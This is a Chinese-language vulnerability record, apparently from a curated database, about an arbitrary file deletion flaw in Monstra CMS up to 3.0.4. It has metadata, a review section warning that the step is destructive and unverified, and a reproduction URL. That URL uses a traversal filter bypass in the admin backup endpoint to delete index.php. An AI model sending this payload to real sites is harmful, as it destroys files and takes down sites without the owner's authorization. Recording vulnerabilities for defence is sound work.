---
source: "hatch 补库批 20260928"
product: "Monstra<=3.0.4"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Monstra CMS <= 3.0.4 任意文件删除漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：后台备份权限及有效token，目录过滤可绕过"
side_effects: "未执行；本文需注意的操作影响：<=范围无依据，删除index.php是破坏性不应作为无损检测；无来源"
source_status: "unknown"
id: "vw-93f7eaf3ceb3fd6a402f7bf1"
entity_id: "ve-93f7eaf3ceb3fd6a402f7bf1"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台备份权限及有效token，目录过滤可绕过

- **凭据与会话边界（1）**：仅URL及慎用，未说后台登录/令牌获取/请求结果，固定token不能复用。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **操作与副作用边界（2）**：&lt;=范围无依据，删除index.php是破坏性不应作为无损检测；无来源。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Monstra CMS \<= 3.0.4 任意文件删除漏洞

一、漏洞简介
------------

慎用

二、漏洞影响
------------

Monstra CMS \<= 3.0.4

三、复现过程
------------

    http://www.0-sec.org/admin/index.php?id=backup&delete_file=/.......//./.......//./index.php&token=f62369587a94433bb2c3c00264e8705171c6189f
